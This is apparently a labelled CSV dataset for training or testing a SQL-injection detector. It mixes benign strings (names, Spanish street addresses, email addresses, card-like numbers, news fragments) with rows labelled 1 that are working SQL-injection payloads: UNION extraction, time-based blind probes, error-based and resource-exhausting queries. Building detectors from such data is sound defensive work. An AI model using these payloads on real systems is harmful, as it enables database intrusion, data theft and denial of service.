Sentence,Label
"-4355""  )  )   )  or 9323 = 9323#",1
1capa2ad*or,0
landau silvestre,0
daisey,0
5335,0
brunella,0
select  ( case when  ( 4111 = 1992 )  then 4111 else 1/ ( select 0 )  end ) --,1
1111,0
tabakov@wdsl.ly,0
 News probes rattled traders area one bigger profit drivers investment banks &apos; trading units past years challenged year low volatility currencies cuts opportunities speculators ,0
50645313a,0
stefana1,0
valcour@piensoparaperros.dj,0
irizar morata,0
select sleep ( 5 )  and '%' = ',1
zapasiewicz@pinkplanetplasencia.bn,0
5425,0
50368,0
" select * from users where id = 1 or ""$ ( "" or 1 = 1 -- 1",1
" select * from users where id = 1 or \<\. union select 1,@@VERSION -- 1",1
" Federal Health Minister Tanya Plibersek announced Commonwealth taking &quot; urgent action &quot; head crisis caused island state &apos;s aging population , higher rates chronic disease system constraints ",0
siripong,0
 You even become Federal President theology degree ,0
"1' where 9420 = 9420 and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
22521771x,0
ardys,0
papandujo,0
"c/ estornino s/n, 9f",0
siu-ling,0
vaciar carrito,0
fiscal,0
mari cielo,0
kulle@coworkers.tl,0
chilches/xilxes,0
1 where 6365 = 6365,1
1 and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) ,1
" The central point focus mobile phone conversations accused third parties , police intercepted ",0
quintilio,0
 There large quantities wood bales straw stored inside ,0
reski.kuberskaya@n340magazin.no,0
0a1q45tu9rt8,0
1'|| ( select 'ifts' from dual where 6329 = 6329,1
 Users Twitter published photos SWAT officer weapon lying ground ,0
"1"" order by 1#",1
" select * from users where id = 1.&&1 union select 1,version (  )  -- 1",1
" The committee considers reconstruction &quot; Vor Heubach &quot; &apos; Vor Kuhbach &quot; railway crossings , crossing agreements already reached Deutsche Bahn , unproblematic ",0
"1 )  and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and  ( 2160 = 2160",1
"1' )  as jiic where 6158 = 6158 or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) --",1
cantillana,0
santa mara de las hoyas,0
"1%'  )  )   union all select null,null,null,null,null,null,null,null,null,null--",1
patoka,0
"1""  )  )   )  or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (   ( ""nrhz"" like ""nrhz",1
"-6263"" union all select 8005,8005#",1
7626,0
18311,0
olaf,0
loganiceo,0
cmitre,0
"calle almonte 68, 5?g",0
 Bill Shuster (R-Pa ,0
ademuz,0
veri5icat1va,0
bjelic@tradedeficit.dd,0
lepine,0
"1' in boolean mode )  and elt ( 4249 = 4249,7259 ) #",1
"plaza toledo 17, 12?b",0
galce,0
"1 )  where 5261 = 5261 and elt ( 1210 = 1210,sleep ( 5  )  )  --",1
"1 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )  ",1
6298939668445611,0
shahir,0
admin' or '1' = '1'/*,1
"1%' )  and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and  ( '%' = '",1
" select * from users where id = 1 or  ( \+ )  = 1 union select 1,@@VERSION -- 1",1
" In Dick &apos;s world , alarmingly similar , mutants look future - police access insight ",0
t99n6a,0
" Baratz &apos;s daughter Katie born male chromosomes , DSD called complete androgen insensitivity syndrome ",0
edelmar,0
1'|| ( select 'zzkx' where 3270 = 3270 and 2006 = 2006,1
"-7689' union all select 8739,8739,8739,8739,8739,8739,8739,8739,8739,8739--",1
weiner,0
"1"" rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo ) ",1
"-8629 where 8049 = 8049 union all select 8049,8049,8049,8049,8049,8049,8049#",1
larissa,0
-7532  )  )   )  or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and   (  (   ( 8332 = 8332,1
edel,0
51795949h,0
p21urit56,0
espina796,0
 or 3 = 3 --,1
" In Thailand largest pawnshop operator , EasyMoney , seen 20 per cent rise number customers using outlets recent months ",0
"1""  )  )   )  and 7135 = 8805#",1
" I &apos;m sure Fenton helped cute clothes , really looked part ",0
1 )  where 1013 = 1013 and 5573 = 9445#,1
1943374801106050,0
1%'  )  )   and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --,1
"1%"" )  and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and  ( ""%"" = """,1
 Doctors &apos;t sure large clitoris small penis convinced could never live &quot; satisfactory life &quot; man ,0
"urbanitzacio europa-fuentes de san bernabe s/n,",0
kallewar,0
 ( select * from  ( select ( sleep ( 5  )  )   ) srmq  )  )  ||',1
select case when 8975 = 2352 then 1 else null end--,1
"1"" )  or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and  ( ""dnmi"" like ""dnmi",1
 As went turn right onto St,0
ajamil,0
4907869$l2,0
chen-che,0
1'  )  )   or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and   (  (  'yqbo' = 'yqbo,1
45240,0
carrer riu sena s/n 13-c,0
 select * from users where id = 1 + ( 1 )  or 1 = 1 -- 1,1
desparpajo,0
munio@so-tel.bn,0
"1""  )  )   )  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users )  and   (  (   ( ""znzb"" like ""znzb",1
1' and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and 'foju' = 'foju,1
08098625a,0
"1%""  )  )   union all select null,null,null,null,null,null--",1
"pablo de rojas, s/n,",0
9210476335859924,0
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (  'pwuy' = 'pwuy",1
"c/ eulogio serdan, 139 5a",0
absaln,0
61676468j,0
" The youngster , village Nantyglo , near Ebbw Vale , South Wales , following footsteps aunt Sharon Howells , showing horses 10 years ",0
" select * from users where id = '1' union select "";""_,version (  )  -- 1'",1
 The entire ground floor suffered damage ,0
h46a00o,0
"1'|| ( select 'zqdn' where 6194 = 6194 union all select null,null,null,null--",1
sparky,0
"c/ pomba, 97",0
37068097d,0
handal hach,0
"select count ( * )  from generate_series ( 1,5000000  )  )  +'",1
 He estimated December 2011 report Spirit &apos;s carry-on fee brings $ 50 million year ,0
68438440p,0
 Nick Kroll rose prominence deep-cable sitcom (FXX &apos;s gleefully raunchy fantasy-football-themed &quot; The League &quot;) Comedy Central sketch show ,0
"-7564' )  as nank where 8095 = 8095 union all select 8095,8095,8095--",1
loke,0
" )  or benchmark ( 10000000,MD5 ( 1  )  )  #",1
rickie,0
rocky,0
selva,0
in5rover88,0
nerti,0
scoccia,0
9161686921830219,0
"1"" and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and ""ojpe"" like ""ojpe",1
taneda@ajuntamentdebcn20.be,0
6629,0
"-4465%' union all select 6196,6196,6196,6196,6196,6196,6196,6196--",1
canciano,0
6206191254660151,0
"1  )  )   )  or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
4808731272531869,0
"1"" )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and  ( ""fpqh"" = ""fpqh",1
2035446499597811,0
"-8929%' )  union all select 9486,9486,9486,9486#",1
8158378459741170,0
"c/ cels gomis i mestre 171,",0
eoin,0
"-9884' )  or elt ( 1942 = 8409,8409 )  and  ( 'tqdq' like 'tqdq",1
varaiya2,0
gonzale.katsuno@viajesparamujeres.tc,0
1  )  )   union all select null#,1
a7p9i9bl2,0
28817883x,0
"-4407"" )  where 2055 = 2055 or elt ( 9714 = 5040,5040 ) --",1
mclendon,0
"1%' )  union all select null,null,null,null,null,null,null,null--",1
 To read Philip K,0
dikaitis5,0
morrin,0
"7 inches , according U",0
baudoin,0
"or 1 = 1 or """" = ",1
"1%"" and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and ""%"" = """,1
19783837l,0
96110447w,0
serratosa@yiutuve.pe,0
sile,0
"c/ montaer ruiz, 24, 12a",0
tamboreo,0
arlota,0
35231,0
alcoroches,0
1'+ ( select 'czpg' where 6627 = 6627 and 2006 = 2006,1
"pesquera, la",0
-4428 )  or 3038 = 3038,1
"1""  )  )   as pafp where 6770 = 6770 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
candombe,0
"1"" )  where 8095 = 8095 and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) --",1
rinaldi albiol,0
sabanaya4,0
"1 )  where 9012 = 9012 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
3491970910096618,0
"c/ norte 9,",0
 Is rub result someone &apos;t like ? In day age pencil seems extraordinary ,0
1' )  where 8167 = 8167,1
911,0
calle minerva 66 12?c,0
26292,0
-2784 )  where 5261 = 5261 or 3472 = 1728#,1
"-4223'  )  )   )  union all select 7913,7913,7913,7913,7913,7913,7913,7913,7913,7913#",1
"c/ pedro lagasca, 176,",0
luceni,0
33652854j,0
parnell,0
02129,0
lanoszka,0
"1 )  where 3915 = 3915 union all select null,null,null,null#",1
"1""  )  )   or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (  ""dacx"" = ""dacx",1
"iif ( 8770 = 9611,1,1/0 ) ",1
"1%""  )  )   )  and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1
prec3+s,0
di lorenzo,0
"1""  )  )   )  and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (   ( ""ksxz"" = ""ksxz",1
13189,0
galln,0
12306474w,0
"-4397'  )  )   )  or make_set ( 9354 = 9354,7185 )  and   (  (   ( 'omqt' = 'omqt",1
cambrils,0
trampeador,0
 In every work genius recognize rejected thoughts: come back us certain alienated majesty,0
 The U,0
"1""  )  )   )  and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (   ( ""sfbc"" = ""sfbc",1
desapercib.idamente,0
escobedo,0
" Around 80 participants came Gemeindehalle (community hall) planned measures explained , express concerns submit ideas ",0
siomara,0
modbar de la emparedada,0
1 )  as zmxb where 8424 = 8424 and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) --,1
"pl. pintor salvador soria 20,",0
3244290959091087,0
colom colldevall,0
55235483v,0
"1' )  and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and  ( 'opll' like 'opll",1
6138,0
dasya4,0
5453326584346927,0
1' where 6913 = 6913 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  --,1
kaile,0
"llobregat 130,",0
zicheng,0
bujaraloz,0
89590939m,0
 or pg_sleep ( __TIME__ ) --,1
-5250 )  where 1591 = 1591 or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,1
"-7851""  )  )   or 6872 = 6872 and   (  (  ""dvbw"" like ""dvbw",1
5825253039721313,0
"1'  )  )   as ylyq where 2953 = 2953 and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
" All sallies rounded law being, inequalities Andes Himmaleh insignificant curve sphere",0
1%'  )  )   )  and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and   (  (   ( '%' = ',1
"1 and make_set ( 9681 = 4703,4703 ) # zbrf",1
"calle vicente seixo 182,",0
 The accused initially remained silent ,0
"-7635"" union all select 1284,1284,1284,1284,1284,1284#",1
31174,0
 Definitely Mr Obeid ,0
hixson,0
houde,0
kwokchoi,0
"-8633"" or 5099 = 5974",1
 The three ship unloaders bridge second transport belt could see rise 10 million ,0
l680jis45,0
linares barreras,0
"1""  )  )   )  or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (   ( ""ldlp"" = ""ldlp",1
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (  'kyos' like 'kyos",1
7009,0
wieth@camiones-hibridos.md,0
1%'  )  )   and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and   (  (  '%' = ',1
" Numerous panels assessing proposals , posing questions researchers ",0
trastabilln,0
37796,0
5970,0
"1"" union all select null,null,null,null,null,null--",1
subitha,0
15280766a,0
7m63e31r,0
dorra,0
77300409p,0
"c/ madre castisima, s/n",0
alatn,0
stockbridge@softstylestudio.mk,0
"sequera de haza, la",0
chimenea,0
1'|| ( select 'npel' from dual where 5258 = 5258,1
"-6294"" union all select 9921,9921,9921,9921,9921,9921--",1
"1  )  )   union all select null,null,null,null#",1
" The aim law take pressure parents might make hasty decisions sex-assignment surgery newborns , fight discrimination intersex ",0
"alcalde baeza medina, s/n,",0
"1"" or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ",1
avenida casanova de eiris 42 3?c,0
"1"" )  where 2367 = 2367",1
mohar@ropadegolf.gg,0
18340,0
"1  )  )   as nlzg where 1482 = 1482 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 ) --",1
" As diets change , people get bigger plane seating radically changed ",0
" Geislingen: More 100 young Catholics Kleiner Heuberg stand together confirmation profession faith In two services , 101 15 16-year-olds Am Kleinen Heuberg pastoral care unit confirmed ",0
"1%'  )  )   or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
80725413j,0
"-3298 union all select 7618,7618,7618,7618,7618,7618,7618,7618,7618,7618#",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
betelu,0
"cubo de tierra del vino, el",0
"-7382'  )  )   or make_set ( 9425 = 4330,4330 )  and   (  (  'tvaz' like 'tvaz",1
"1'  )  )   or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and   (  (  'kmjn' = 'kmjn",1
select  ( case when  ( 4043 = 5276 )  then 4043 else 4043* ( select 4043 from information_schema.character_sets )  end ) #,1
-4058 )  union all select 9184--,1
clivosa,0
forfoleda,0
70679983v,0
mori@itrends.do,0
mead-neudorfer4@joyclub.au,0
"1%""  )  )   )  and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (   ( ""%"" = """,1
silde,0
"1%"" )  and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and  ( ""%"" = """,1
rapisarda_macginnis@discography.ye,0
41309,0
 1 week ,0
"-4745"" or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and ""nifq"" like ""nifq",1
hormilleja,0
"-6798%""  )  )   )  or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (   ( ""%"" = """,1
taber2era,0
pasivamente,0
" Until recently , really &apos;t feel sorry much grief caused people ",0
rez,0
 The judging panel also award bonus points &quot; outfits &quot; ,0
72620654v,0
filpica,0
"1'  )  )   and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and   (  (  'adnz' = 'adnz",1
61947998m,0
 Trainer Tomasz Malmon let doubt fact ,0
perales del alfambra,0
' ) ;waitfor delay '0:0:__TIME__'--,1
select sleep ( 5  )  )  +',1
lagata,0
" &quot; Bernard Squarcini , former head French internal intelligence agency DCRI , quoted interview month saying: &quot; The services know perfectly well countries , even co-operate antiterrorist fight , spy allies ",0
85855294c,0
pages@spainbb.kh,0
80920943c,0
troule politi,0
1 )  and  ( 2342 = 3620 ) *3620,1
albacete,0
"), chairman House Transportation Committee , said , , sees viable long-term alternative ",0
24387950s,0
berges@monsur.pt,0
"1"" )  as tqxa where 6751 = 6751 or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) --",1
pelle1@906.com.aq,0
prats de lluans,0
sarri de ter,0
" select * from users where id = 1 or ""1;"" = 1 or 1 = 1 -- 1",1
"select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""fkdx"" like ""fkdx",1
ling-yu,0
1%'  )  )   and 2006 = 2006,1
"praza da herva 144,",0
"1"" )  order by 1--",1
" &quot; Despite losing attempt acquire patents-in-suit auction , Google infringed continues infringe , &quot; lawsuit said ",0
"1%"" )  and make_set ( 8403 = 8403,8899 )  and  ( ""%"" = """,1
roderick,0
292,0
1'  )  )   as qovd where 8865 = 8865 and  ( 3020 = 3020 ) *6703--,1
" Schools urged focus maths , spelling grammar English literature courses require pupils study least one Shakespeare play , 19th century novel , Romantic poetry contemporary British fiction 1914 onwards ",0
almarza de cameros,0
shanta,0
1' )  rlike sleep ( 5 )  and  ( 'tslp' = 'tslp,1
gerardo,0
29456732b,0
"1'+ ( select 'idmr' where 5029 = 5029 union all select null,null,null,null,null,null--",1
"-1737' or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and 'fsmd' = 'fsmd",1
4a47j69a,0
"-8881%' union all select 8420,8420,8420,8420,8420,8420,8420#",1
"1""  )  )   )  or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( ""nthu"" like ""nthu",1
dyck,0
jack@cenitsoria.sc,0
leanne,0
" For reason , traditional email like open postcard sealed letter ",0
pro8i2ic6r,0
1'|| ( select 'fven' where 1433 = 1433 and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq'  )  )  ||',1
drier@hotelesymas.cl,0
"1',updatexml ( 2917,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 2917 = 2917,1  )  )   ) ,0x717a767a71 ) ,8295 ) ",1
sagaceta farell,0
danisa,0
kalpak,0
6225,0
1' )  rlike sleep ( 5 ) ,1
"1 and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  ",1
"-2722"" )  or 4907 = 8126#",1
1' rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and 'obwn' = 'obwn,1
-4137  )  )   as elxu where 5672 = 5672 order by 1--,1
calle madagascar 130,0
kamil,0
"-4798""  )  )   )  union all select 7892,7892,7892,7892,7892,7892,7892,7892,7892,7892#",1
ericsson,0
ralina,0
los caprichos 126,0
 Piercing beep disturbs residents Rhenus Midgard also invested highly land They stockpile coal arrives ships ,0
desnaturar,0
4611888318080805,0
"c/ benimaclet, 46",0
"c/ zamora, 151, 1-b",0
"select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3-- ampw",1
elane,0
97084633t,0
schwuchow9@viajessolomujeres.bj,0
nardo,0
"barcelona 149, 5-e",0
mol,0
ishida lasalle,0
1  )  )   and 2886 = 1133--,1
alred,0
sant pau de segries,0
chmara@novolardiseno.ky,0
"-9504%""  )  )   or 8098 = 7472",1
"1' )  and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and  ( 'qvrd' = 'qvrd",1
ornellas3@professionalhost.com.pro,0
 I wish please him; I wish wish please me,0
02600,0
28359,0
" &quot; The company radically unacceptably cutting back , despite price increase letters January 2013 ",0
-7041' )  where 6307 = 6307 or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,1
"9 billion candy , costumes decorations , according National Retail Federation ",0
"-3282' )  union all select 9002,9002,9002,9002,9002#",1
verile,0
"1 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
wido,0
-5026' or  ( 8459 = 8459 ) *4906 and 'uavj' like 'uavj,1
"1', ( select  ( case when  ( 5217 = 5217 )  then 1 else 5217* ( select 5217 from mysql.db )  end  )  )  ",1
reencar!nacin,0
"c/ curadero, 101, 12?e",0
"iif ( 6307 = 2459,1,1/0 ) ",1
vellora,0
5802409488938737,0
bohord1r,0
jiinshuh,0
229i9967te,0
 The judge ruled August city violated Constitution way carried program stopping questioning people ,0
leth8,0
"calle doctor fleming 52,",0
"1""  )  )   or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and   (  (  ""nubc"" like ""nubc",1
"1"" )  as fkgs where 5948 = 5948 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
5223158056651718,0
lukers,0
1858,0
-5547' or 9323 = 9323#,1
cotner,0
05696,0
48,0
"1'  )  )   and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (  'ijyi' = 'ijyi",1
" There may also deviations could show physicians path new theory , umbrella known natural laws could united ",0
48600,0
cuarentona,0
a65esad0,0
2409731978356224,0
"S government admit US spying crossed line , emphasised one &apos;s rights abused ",0
33180,0
" Historically high prices gold past two years added rush pawn personal belongings , people take opportunity cash value family jewellery ",0
"c/ zumalacarregui 87,",0
96804276j,0
juneho,0
elorrio,0
"1 )  where 4810 = 4810 union all select null,null#",1
1'|| ( select 'irfn' where 8360 = 8360,1
anglaril,0
' or ''*',1
"1%""  )  )   waitfor delay '0:0:5' and   (  (  ""%"" = """,1
5106,0
"c/ murillo, 106 5c",0
"1%'  )  )   )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( '%' = '",1
ab6ga*d45co,0
38410,0
" In 1970s , city fathers wanted car-friendly city , therefore sections old city wall remain tall ",0
72622550g,0
3728906567349968,0
"-3555' )  or make_set ( 9354 = 9354,7185 )  and  ( 'papr' = 'papr",1
abuuelada,0
enrique,0
0cald53sm6,0
" The next stop tour praetorium , participants descend depths ",0
50420,0
lena,0
53424203x,0
salom,0
" This time around , secretary Rolf Wagener delighted receive special &quot; Singer Year &quot; award ",0
04or2ativ1,0
distar,0
"1""  )  )   as sqow where 8752 = 8752",1
efrn,0
"1%' and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   and '%' = '",1
juglandea,0
"select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3# sfup",1
"1%""  )  )   )  and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and   (  (   ( ""%"" = """,1
montroy,0
1 )  where 9683 = 9683,1
13191,0
roldan@intelethernet.gl,0
17130,0
 Kenya media drew ire authorities broadcasting security camera footage troops dispatched scene attack purportedly robbing upmarket mall ,0
apat17,0
1 )  where 6150 = 6150,1
" select * from users where id = 1 or \.<$ union select 1,@@VERSION -- 1",1
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual and ""psbz"" = ""psbz",1
1 uni/**/on select all from where,1
"1"" or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and ""regi"" like ""regi",1
"1%' and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
byoungin,0
1' or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and 'hokd' = 'hokd,1
